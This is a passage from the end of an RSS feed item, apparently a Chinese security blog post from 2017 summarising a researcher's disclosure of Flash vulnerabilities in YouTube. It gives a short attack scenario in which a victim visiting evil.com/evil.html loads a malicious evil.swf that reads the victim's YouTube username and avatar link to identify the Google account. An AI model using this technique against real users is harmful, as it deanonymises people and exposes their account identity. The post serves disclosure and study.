trace(leakEvent.data.user_picture);&lt;/code&gt;&lt;p&gt;大致工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a10403d51f4083427c26a8e2266857fc_r.png&quot; data-rawwidth=&quot;1358&quot; data-rawheight=&quot;486&quot;&gt;&lt;h2&gt;攻击方案&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;前提条件： 用户安装了 flash 并登录到 Google&lt;/li&gt;&lt;li&gt;1：目标访问攻击者控制的 evil.com/evil.html ，该页面包含了一个恶意 Flash 文件&lt;br&gt;evil.swf&lt;/li&gt;&lt;li&gt;2：evil.swf 加载 Youtube wrapper 并获取目标的用户名。除此之外，还可能通过用户头像的链接来判断出谷歌帐号&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Enguerran Gillier&lt;/b&gt; ---&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-09-29195210</guid>
<pubDate>Sat, 09 Sep 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
